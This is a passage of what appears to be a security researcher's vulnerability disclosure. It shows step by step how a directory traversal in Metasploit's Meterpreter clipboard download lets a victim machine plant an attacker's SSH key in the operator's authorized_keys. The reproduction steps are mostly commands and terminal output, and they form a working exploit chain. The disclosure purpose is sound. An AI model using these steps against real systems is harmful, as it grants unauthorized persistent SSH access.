[*] Started reverse TCP handler on 172.18.0.5:4444
[*] Starting the payload handler...
```

Run the stageless Meterpreter payload on a remote machine to initiate a
session:

```text
[*] Meterpreter session 1 opened (172.18.0.5:4444 -> 172.17.24.85:50469) at 2017-01-03 22:36:54 +1000
```

6\. Create a malicious directory for download

We know that the patched Meterpreter will inform Metasploit that the file
`C:/doot/doot/..` has been copied to the clipboard.

Metasploit will then attempt to download the file `C:/doot/doot/..` (i.e. the
directory `C:/doot/`) to `$DESTINATIONDIR/..` which will trigger the directory
traversal vulnerability.

Create a directory layout as follows:

```text
C:\
|
|-- doot\
   |
   |-- doot\
   |
   |-- .ssh\
      |
      |-- authorized_keys
```

```text
C:\Users\Justin>mkdir \doot

C:\Users\Justin>mkdir \doot\doot

C:\Users\Justin>mkdir \doot\.ssh

C:\Users\Justin>echo An evil SSH public key >> \doot\.ssh\authorized_keys
```

7\. Trigger the bug

Before triggering the bug, note that `authorized_keys` on the victim's machine
contains an innocent SSH public key:

```text
msf exploit(handler) > cat /home/justin/.ssh/authorized_keys
[*] exec: cat /home/justin/.ssh/authorized_keys

Just an innocent SSH public key
```

On the Meterpreter machine, copy any file to the clipboard to ensure that our
patched code is triggered.

If we were to take a look at the contents of the clipboard via the Meterpreter
session, it would look quite strange:

```text
msf exploit(handler) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > use extapi
Loading extension extapi...WARNING: Local file /home/justin/work/metasploitsploit/metasploit-framework/data/meterpreter/ext_server_extapi.x64.dll is being used
success.

meterpreter > clipboard_get_data
Files captured at 2017-01-03 12:40:16.0185
==========================================
Remote Path : C:\doot\doot\..
File size   : 1354752 bytes

==========================================
```

Trigger the bug by downloading the attacker's clipboard contents to a directory
within your home directory:

```text
meterpreter > clipboard_get_data -d /home/justin/looted_clipboard
Files captured at 2017-01-03 12:41:08.0991
==========================================
Remote Path : C:\doot\doot\..
File size   : 1354752 bytes
mirroring   : C:\doot\doot\..\.ssh -> /home/justin/looted_clipboard/../.ssh
downloading : C:\doot\doot\..\.ssh\authorized_keys -> /home/justin/looted_clipboard/../.ssh/authorized_keys
download    : C:\doot\doot\..\.ssh\authorized_keys -> /home/justin/looted_clipboard/../.ssh/authorized_keys
mirrored    : C:\doot\doot\..\.ssh -> /home/justin/looted_clipboard/../.ssh
mirroring   : C:\doot\doot\..\doot -> /home/justin/looted_clipboard/../doot
mirrored    : C:\doot\doot\..\doot -> /home/justin/looted_clipboard/../doot

==========================================

```

`authorized_keys` now contains an evil SSH public key:

```text
meterpreter > ^Z
Background session 1? [y/N]

msf exploit(handler) > cat /home/justin/.ssh/authorized_keys
[*] exec: cat /home/justin/.ssh/authorized_keys

An evil SSH public key
```

---

Justin Steven

<https://twitter.com/justinsteven>
